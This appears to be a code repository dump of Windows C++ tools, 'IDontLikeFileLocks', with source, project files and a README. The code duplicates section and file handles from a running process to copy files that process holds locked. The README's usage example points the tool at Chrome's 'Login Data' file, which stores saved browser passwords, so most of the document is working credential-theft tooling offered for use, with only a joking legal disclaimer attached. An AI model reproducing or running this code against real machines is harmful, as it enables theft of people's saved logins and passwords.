        DWORD Result = ::GetMappedFileNameW(::GetCurrentProcess(), Base, DevicePath, MAX_PATH * 2);

        NtUnmapViewOfSection(::GetCurrentProcess(), Base);

        if (!Result)
         return L"";

        std::wstring Path = DevicePath;
        WCHAR Drives[512];
        if (::GetLogicalDriveStringsW(512, Drives)) {
            WCHAR* Drive = Drives;
            while (*Drive) {
                WCHAR DevName[MAX_PATH];
                WCHAR Letter[3] = { Drive[0], L':', 0 };
                if (::QueryDosDeviceW(Letter, DevName, MAX_PATH)) {
                    SIZE_T DevLen = ::wcslen(DevName);
                    if (Path.size() >= DevLen && ::_wcsnicmp(Path.c_str(), DevName, DevLen) == 0) {
                        Path = std::wstring(Letter) + Path.substr(DevLen);
                        break;
                    }
                }
                Drive += ::wcslen(Drive) + 1;
            }
        }

        return Path;
    }

}

namespace str {

    std::wstring Lower(const std::wstring& S) {
        std::wstring Result = S;
        std::transform(Result.begin(), Result.end(), Result.begin(), ::towlower);
        return Result;
    }

}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        ::wprintf(L"usage: %s <proc.exe> <filename>\n", argv[0]);
        return 0;
    }

    DWORD Pid = proc::FindByName(argv[1]);
    if (!Pid) {
        ::wprintf(L"[!] proc not found\n");
        return 0;
    }

    ::wprintf(L"[+] found proc: %d\n", Pid);

    // kernel32!OpenProcess -> PROCESS_DUP_HANDLE for handle duplication
    HANDLE HProc = ::OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, Pid);
    if (!HProc) {
        ::wprintf(L"[!] OpenProcess failed: %d\n", ::GetLastError());
        return 0;
    }

    PfnNtQuerySystemInformation NtQuerySystemInformation =
    (PfnNtQuerySystemInformation)::GetProcAddress(::GetModuleHandleW(L"ntdll"), "NtQuerySystemInformation");

    PfnNtDuplicateObject NtDuplicateObject =
    (PfnNtDuplicateObject)::GetProcAddress(::GetModuleHandleW(L"ntdll"), "NtDuplicateObject");
 
    PfnNtMapViewOfSection NtMapViewOfSection =
    (PfnNtMapViewOfSection)::GetProcAddress(::GetModuleHandleW(L"ntdll"), "NtMapViewOfSection");

    ULONG BufSize = 1024 * 1024 * 2;
    std::vector<BYTE> Buf(BufSize);

    // ntdll!NtQuerySystemInformation -> SystemHandleInformation (16)
    NTSTATUS Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)16, Buf.data(), BufSize, &BufSize);

    if (Status == 0xC0000004) { 
        Buf.resize(BufSize + 1024);
        Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)16, Buf.data(), (ULONG)Buf.size(), &BufSize);
    }

    if (!NT_SUCCESS(Status)) {
        ::wprintf(L"[!] handle query failed: 0x%08X\n", Status);
        ::CloseHandle(HProc);
        return 0;
    }

    PSYSTEM_HANDLE_INFORMATION HandleInfo = (PSYSTEM_HANDLE_INFORMATION)Buf.data();
    ::wprintf(L"[+] enumerating %lu handles\n", HandleInfo->HandleCount);

    std::wstring SearchTerm = str::Lower(argv[2]);

    for (ULONG i = 0; i < HandleInfo->HandleCount; i++) {
        SYSTEM_HANDLE& H = HandleInfo->Handles[i];
        if (H.ProcessId != Pid)
            continue;

        HANDLE HDup = nullptr;

        if (!NT_SUCCESS(NtDuplicateObject(
            HProc,
            (HANDLE)(ULONG_PTR)H.Handle,
            ::GetCurrentProcess(),
            &HDup,
            SECTION_MAP_READ,
            0,
            0)))
            continue;

        std::wstring Type = obj::GetType(HDup);
        if (Type != L"Section") {
            ::CloseHandle(HDup);
            continue;
        }

        std::wstring FullPath = section::GetFileName(HDup);
        if (FullPath.empty()) {
            ::CloseHandle(HDup);
            continue;
        }

        const WCHAR* FileName = ::PathFindFileNameW(FullPath.c_str());
        std::wstring FileNameLower = str::Lower(FileName);

        if (FileNameLower != SearchTerm) {
            ::CloseHandle(HDup);
            continue;
        }

        ::wprintf(L"[+] found section: %s\n", FullPath.c_str());

        PVOID Base = nullptr;
        SIZE_T ViewSize = 0;

        if (NT_SUCCESS(NtMapViewOfSection(
            HDup,
            ::GetCurrentProcess(),
            &Base,
            0,
            0,
            nullptr,
            &ViewSize,
            ViewShare,
            0,
            PAGE_READONLY))) {

            HANDLE HFile = ::CreateFileW(
                L"dump.bin",
                GENERIC_WRITE,
                0,
                nullptr,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                nullptr
            );

            if (HFile != INVALID_HANDLE_VALUE) {
                DWORD Written;
                ::WriteFile(HFile, Base, (DWORD)ViewSize, &Written, nullptr);
                ::CloseHandle(HFile);
                ::wprintf(L"[+] dumped %llu bytes -> dump.bin\n", (ULONGLONG)ViewSize);
            }

            ::CloseHandle(HDup);
            ::CloseHandle(HProc);
            return 0;
        }

        ::CloseHandle(HDup);
    }

    ::wprintf(L"[!] section not found\n");
    ::CloseHandle(HProc);
    return 0;
}
```

`FindFileInSection/IDontLikeFileLocks/IDontLikeFileLocks.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{ac2f8d41-ecb4-49f8-9da4-eacefbd1e186}</ProjectGuid>
    <RootNamespace>IDontLikeFileLocks</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="IDontLikeFileLocks.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`FindFileInSection/IDontLikeFileLocks/IDontLikeFileLocks.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="IDontLikeFileLocks.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`FindFileInSection/IDontLikeFileLocks/IDontLikeFileLocks.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`FindFileInSection/Readme.md`:

```md
# IDontLikeFileLocks-SectionDumper
dump locked files by duplicating section object handles and mapping them into our process

## How It Works
instead of reading file handles directly, we target **section objects** (mem mapped file representations).

when a process maps a file into memory (common for databases like sqlite), windows creates a section object that backs the mapping. this section object can be mapped into multiple processes simultaneously.

we enumerate the syswide handle table using `NtQuerySystemInformation` to find all handles owned by the target process. for each handle, we:
- duplicate it into our process with `NtDuplicateObject`
- check if it's a Section object type via `NtQueryObject`
- temporarily map it to get the backing filename via `GetMappedFileNameW`
- compare the filename against what we're looking for

once we find the right section, we map it into our address space with `NtMapViewOfSection` (ReadOnly), copy the entire contents to disk, then unmap and close.

## Why This Works ü§î
section objects represent files that are **already mapped into memory**.
mapping a section is not the same as opening a file. the file was opened when the section was created. we're just attaching to existing shared memory.

## Usage
```
IDontLikeFileLocks.exe chrome.exe "Login Data"
```
output goes to `dump.bin` in current directory

## Architecture
tested on x64 Windows 11

## Technical Details
- NT APIs only (ntdll + psapi for path conversion)
- system handle enumeration via `NtQuerySystemInformation(SystemHandleInformation)`
- section identification via `NtQueryObject(ObjectTypeInformation)`
- filename resolution by temporarily mapping + `GetMappedFileNameW` + device name conversion
- final dump via `NtMapViewOfSection` with PAGE_READONLY
- exact filename match only (no substring) to avoid false positives like "Login Data For Account"

## How i done it??
- 1) Step Find handles or dlls using processhacker: <img width="541" height="73" alt="image" src="https://github.com/user-attachments/assets/a327b063-a974-4f5d-bdbb-8962066046ea" />
- 2) Theres bunch of handle types, section,file,mapped we can filter based on that :) : <img width="1054" height="396" alt="image" src="https://github.com/user-attachments/assets/65198b6a-586d-4935-ba52-c4c3ee680ccf" />


## Legal
don't use this on machines you don't own or have permission to test on.  
prison food is mid and they don't let you code ü§î‚ùó

Credits - me

```

`HandleDupliClosin/IDontLikeFileLocks.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.14.36203.30 d17.14
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "IDontLikeFileLocks", "IDontLikeFileLocks\IDontLikeFileLocks.vcxproj", "{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x64.ActiveCfg = Debug|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x64.Build.0 = Debug|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x86.ActiveCfg = Debug|Win32
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x86.Build.0 = Debug|Win32
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x64.ActiveCfg = Release|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x64.Build.0 = Release|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x86.ActiveCfg = Release|Win32
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {2C74EC44-012E-4E23-99EE-34A6B0C3CCBC}
	EndGlobalSection
EndGlobal

```

`HandleDupliClosin/IDontLikeFileLocks/IDontLikeFileLocks.cpp`:

```cpp
#pragma once

#include<windows.h>
#include<winternl.h>
#include<string>
#include<vector>
#include<map>
#include<cstdio>
// i recommend making one hpp and just make this into plug n play. thecode is very messy but it works...
namespace IDontLikeFileLocks {

    struct SYSTEM_HANDLE_ENTRY {
        HANDLE Handle;
        ULONG_PTR ObjectPointerCount;
        ULONG_PTR HandleReferenceCount;
        ULONG GrantedAccess;
        ULONG ObjectTypeIndex;
        ULONG HandleAttributes;
        ULONG Reserved;
    };

    struct SYSTEM_HANDLE_INFORMATION_EX {
        ULONG_PTR NumberOfHandles;
        ULONG_PTR Reserved;
        SYSTEM_HANDLE_ENTRY Handles[1];
    };

    struct OBJECT_TYPE_INFORMATION {
        UNICODE_STRING TypeName;
        ULONG TotalNumberOfObjects;
        ULONG TotalNumberOfHandles;
    };

    struct SYSTEM_PROCESS_INFORMATION {
        ULONG NextEntryOffset;
        ULONG NumberOfThreads;
        BYTE Reserved1[48];
        UNICODE_STRING ImageName;
        LONG BasePriority;
        HANDLE UniqueProcessId;
        PVOID Reserved2;
        ULONG HandleCount;
        ULONG SessionId;
        PVOID Reserved3;
        SIZE_T PeakVirtualSize;
        SIZE_T VirtualSize;
        ULONG Reserved4;
        SIZE_T PeakWorkingSetSize;
        SIZE_T WorkingSetSize;
        PVOID Reserved5;
        SIZE_T QuotaPagedPoolUsage;
        PVOID Reserved6;
        SIZE_T QuotaNonPagedPoolUsage;
        SIZE_T PagefileUsage;
        SIZE_T PeakPagefileUsage;
        SIZE_T PrivatePageCount;
        LARGE_INTEGER Reserved7[6];
    };

    struct FILE_STANDARD_INFO {
        LARGE_INTEGER AllocationSize;
        LARGE_INTEGER EndOfFile;
        ULONG NumberOfLinks;
        BOOLEAN DeletePending;
        BOOLEAN Directory;
    };

    struct FILE_POSITION_INFO {
        LARGE_INTEGER CurrentByteOffset;
    };

    struct FILE_NAME_INFO {
        ULONG FileNameLength;
        WCHAR FileName[1];
    };

    using NtQuerySystemInformation = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
    using NtQueryInformationProcess = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    using NtQueryObject = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    using NtClose = NTSTATUS(NTAPI*)(HANDLE);
    using NtReadFile = NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
    using NtQueryInformationFile = NTSTATUS(NTAPI*)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, ULONG);
    using NtSetInformationFile = NTSTATUS(NTAPI*)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, ULONG);
    using NtDuplicateObject = NTSTATUS(NTAPI*)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
    using NtOpenProcess = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PVOID);
    using NtCreateFile = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
    using NtWriteFile = NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
    using RtlCreateUserThread = NTSTATUS(NTAPI*)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PVOID, PVOID, PHANDLE, PVOID);
    using RtlGetCurrentDirectory_U = ULONG(NTAPI*)(ULONG, PWSTR);

    namespace nt {

        HMODULE ntdll = ::GetModuleHandleW(L"ntdll.dll");

        NtQuerySystemInformation QuerySystemInformation = (NtQuerySystemInformation)::GetProcAddress(ntdll, "NtQuerySystemInformation");
        NtQueryInformationProcess QueryInformationProcess = (NtQueryInformationProcess)::GetProcAddress(ntdll, "NtQueryInformationProcess");
        NtQueryObject QueryObject = (NtQueryObject)::GetProcAddress(ntdll, "NtQueryObject");
        NtClose Close = (NtClose)::GetProcAddress(ntdll, "NtClose");
        NtReadFile ReadFile = (NtReadFile)::GetProcAddress(ntdll, "NtReadFile");
        NtQueryInformationFile QueryInformationFile = (NtQueryInformationFile)::GetProcAddress(ntdll, "NtQueryInformationFile");
        NtSetInformationFile SetInformationFile = (NtSetInformationFile)::GetProcAddress(ntdll, "NtSetInformationFile");
        NtDuplicateObject DuplicateObject = (NtDuplicateObject)::GetProcAddress(ntdll, "NtDuplicateObject");
        NtOpenProcess OpenProcess = (NtOpenProcess)::GetProcAddress(ntdll, "NtOpenProcess");
        NtCreateFile CreateFile = (NtCreateFile)::GetProcAddress(ntdll, "NtCreateFile");
        NtWriteFile WriteFile = (NtWriteFile)::GetProcAddress(ntdll, "NtWriteFile");
        RtlCreateUserThread CreateUserThread = (RtlCreateUserThread)::GetProcAddress(ntdll, "RtlCreateUserThread");
        RtlGetCurrentDirectory_U GetCurrentDirectory = (RtlGetCurrentDirectory_U)::GetProcAddress(ntdll, "RtlGetCurrentDirectory_U");

    }

    std::map<DWORD, std::vector<SYSTEM_HANDLE_ENTRY>> ScanProcesses(const std::wstring& target) {
        std::map<DWORD, std::vector<SYSTEM_HANDLE_ENTRY>> result;

        ULONG bufsize = 1024 * 1024;
        std::vector<BYTE> buf;
        NTSTATUS status = 0xC0000004;

        while (status == 0xC0000004) {
            buf.resize(bufsize);
            status = nt::QuerySystemInformation(5, buf.data(), bufsize, &bufsize);
        }

        if (status != 0) {
            return result;
        }

        ULONG offset = 0;
        while (offset < buf.size()) {
            auto* info = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(buf.data() + offset);

            if (info->UniqueProcessId && info->ImageName.Buffer) {
                std::wstring name(info->ImageName.Buffer, info->ImageName.Length / sizeof(WCHAR));

                if (_wcsicmp(name.c_str(), target.c_str()) == 0) {
                    DWORD pid = static_cast<DWORD>(reinterpret_cast<ULONG_PTR>(info->UniqueProcessId));

                    CLIENT_ID cid{};
                    cid.UniqueProcess = info->UniqueProcessId;

                    OBJECT_ATTRIBUTES oa{};
                    oa.Length = sizeof(OBJECT_ATTRIBUTES);

                    HANDLE hproc = nullptr;

                    if (nt::OpenProcess(&hproc, PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, &oa, &cid) == 0) {
                        ULONG hbufsize = 0;
                        std::vector<BYTE> hbuf;
                        NTSTATUS hstatus = 0xC0000004;

                        while (hstatus == 0xC0000004) {
                            if (hbufsize > 0) {
                                hbuf.resize(hbufsize);
                            }
                            hstatus = nt::QueryInformationProcess(hproc, 51, hbufsize > 0 ? hbuf.data() : nullptr, hbufsize, &hbufsize);
                        }

                        if (hstatus == 0 && hbufsize >= sizeof(SYSTEM_HANDLE_INFORMATION_EX)) {
                            auto* hinfo = reinterpret_cast<SYSTEM_HANDLE_INFORMATION_EX*>(hbuf.data());
                            ULONG_PTR count = hinfo->NumberOfHandles;

                            if (count > 0) {
                                size_t expected = sizeof(SYSTEM_HANDLE_INFORMATION_EX) + (count - 1) * sizeof(SYSTEM_HANDLE_ENTRY);

                                if (hbufsize >= expected) {
                                    std::vector<SYSTEM_HANDLE_ENTRY> handles;
                                    handles.assign(hinfo->Handles, hinfo->Handles + count);
                                    result[pid] = std::move(handles);
                                }
                            }
                        }

                        nt::Close(hproc);
                    }
                }
            }

            if (info->NextEntryOffset == 0) {
                break;
            }
            offset += info->NextEntryOffset;
        }

        return result;
    }

    struct ExtractResult {
        std::vector<BYTE> data;
        std::wstring path;
        bool success = false;
        std::wstring error;
    };

    ExtractResult ExtractFileFromHandle(HANDLE handle, DWORD owner, const std::wstring& pattern) {
        ExtractResult result;

        CLIENT_ID cid{};
        cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(owner));

        OBJECT_ATTRIBUTES oa{};
        oa.Length = sizeof(OBJECT_ATTRIBUTES);

        HANDLE hproc = nullptr;
        if (nt::OpenProcess(&hproc, PROCESS_DUP_HANDLE, &oa, &cid) != 0) {
            result.error = L"Failed to open process";
            return result;
        }

        HANDLE hdup = nullptr;
        HANDLE hcur = reinterpret_cast<HANDLE>(-1);
        ULONG access = FILE_READ_DATA | FILE_WRITE_DATA | FILE_APPEND_DATA |
            FILE_READ_EA | FILE_WRITE_EA | FILE_READ_ATTRIBUTES |
            FILE_WRITE_ATTRIBUTES | READ_CONTROL | SYNCHRONIZE;

        if (nt::DuplicateObject(hproc, handle, hcur, &hdup, access, 0, 0) != 0) {
            nt::Close(hproc);
            result.error = L"Failed to duplicate handle";
            return result;
        }

        ULONG tbufsize = 0;
        std::vector<BYTE> tbuf;
        NTSTATUS status = 0xC0000004;

        while (status == 0xC0000004) {
            if (tbufsize > 0) {
                tbuf.resize(tbufsize);
            }
            status = nt::QueryObject(hdup, 2, tbufsize > 0 ? tbuf.data() : nullptr, tbufsize, &tbufsize);
        }

        if (status != 0) {
            nt::Close(hdup);
            nt::Close(hproc);
            result.error = L"Failed to query object type";
            return result;
        }

        auto* tinfo = reinterpret_cast<OBJECT_TYPE_INFORMATION*>(tbuf.data());
        if (!tinfo->TypeName.Buffer) {
            nt::Close(hdup);
            nt::Close(hproc);
            result.error = L"No type name";
            return result;
        }

        std::wstring tname(tinfo->TypeName.Buffer, tinfo->TypeName.Length / sizeof(WCHAR));
        if (tname != L"File") {
            nt::Close(hdup);
            nt::Close(hproc);
            result.error = L"Not a file handle";
            return result;
        }

        ULONG nbufsize = 4096;
        std::vector<BYTE> nbuf(nbufsize);
        IO_STATUS_BLOCK iosb{};

        if (nt::QueryInformationFile(hdup, &iosb, nbuf.data(), nbufsize, 9) != 0) {
            nt::Close(hdup);
            nt::Close(hproc);
            result.error = L"Failed to query file name";
            return result;
        }

        auto* ninfo = reinterpret_cast<FILE_NAME_INFO*>(nbuf.data());
        ULONG nlen = ninfo->FileNameLength / sizeof(WCHAR);

        if (nlen > 0) {
            std::wstring fullpath(ninfo->FileName, nlen);

            size_t sep = fullpath.rfind(L'\\');
            if (sep == std::wstring::npos) {
                sep = fullpath.rfind(L'/');
            }

            std::wstring filename = (sep == std::wstring::npos) ? fullpath : fullpath.substr(sep + 1);

            if (_wcsicmp(filename.c_str(), pattern.c_str()) != 0) {
                nt::Close(hdup);
                nt::Close(hproc);
                result.error = L"File name does not match pattern";
                return result;
            }

            FILE_STANDARD_INFO sinfo{};
            iosb = {};

            if (nt::QueryInformationFile(hdup, &iosb, &sinfo, sizeof(sinfo), 5) != 0) {
                nt::Close(hdup);
                nt::Close(hproc);
                result.error = L"Failed to query file size";
                result.path = fullpath;
                return result;
            }

            LONGLONG fsz = sinfo.EndOfFile.QuadPart;
            if (fsz == 0) {
                result.path = fullpath;
                result.success = true;
                nt::Close(hdup);
                nt::Close(hproc);
                return result;
            }

            FILE_POSITION_INFO pinfo{};
            pinfo.CurrentByteOffset.QuadPart = 0;
            nt::SetInformationFile(hdup, &iosb, &pinfo, sizeof(pinfo), 14);

            result.data.resize(static_cast<size_t>(fsz));
            iosb = {};

            if (nt::ReadFile(hdup, nullptr, nullptr, nullptr, &iosb, result.data.data(), static_cast<ULONG>(fsz), nullptr, nullptr) != 0) {
                nt::Close(hdup);
                nt::Close(hproc);
                result.error = L"Failed to read file";
                result.path = fullpath;
                return result;
            }

            result.data.resize(static_cast<size_t>(iosb.Information));
            result.path = fullpath;
            result.success = true;
        }
        else {
            result.error = L"Empty file name";
        }

        nt::Close(hdup);
        nt::Close(hproc);
        return result;
    }

    bool WriteFileToDisk(const std::vector<BYTE>& content, const std::wstring& dest) {
        std::wstring path;

        if (dest.length() >= 2 && dest[1] == L':') {
            path = dest;
        }
        else {
            WCHAR cwd[MAX_PATH]{};
            ULONG len = nt::GetCurrentDirectory(sizeof(cwd), cwd);
            if (len == 0) {
                return false;
            }
            path = std::wstring(cwd) + L"\\" + dest;
        }

        path = L"\\??\\" + path;

        UNICODE_STRING us{};
        us.Length = static_cast<USHORT>(path.length() * sizeof(WCHAR));
        us.MaximumLength = us.Length + sizeof(WCHAR);
        us.Buffer = const_cast<PWSTR>(path.c_str());

        OBJECT_ATTRIBUTES oa{};
        oa.Length = sizeof(OBJECT_ATTRIBUTES);
        oa.ObjectName = &us;
        oa.Attributes = OBJ_CASE_INSENSITIVE;

        IO_STATUS_BLOCK iosb{};
        HANDLE hfile = nullptr;

        NTSTATUS status = nt::CreateFile(&hfile, FILE_WRITE_DATA | FILE_APPEND_DATA | SYNCHRONIZE, &oa, &iosb,
            nullptr, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, nullptr, 0);

        if (status != 0) {
            return false;
        }

        iosb = {};
        status = nt::WriteFile(hfile, nullptr, nullptr, nullptr, &iosb,
            const_cast<PVOID>(static_cast<const void*>(content.data())), static_cast<ULONG>(content.size()), nullptr, nullptr);

        nt::Close(hfile);
        return status == 0;
    }

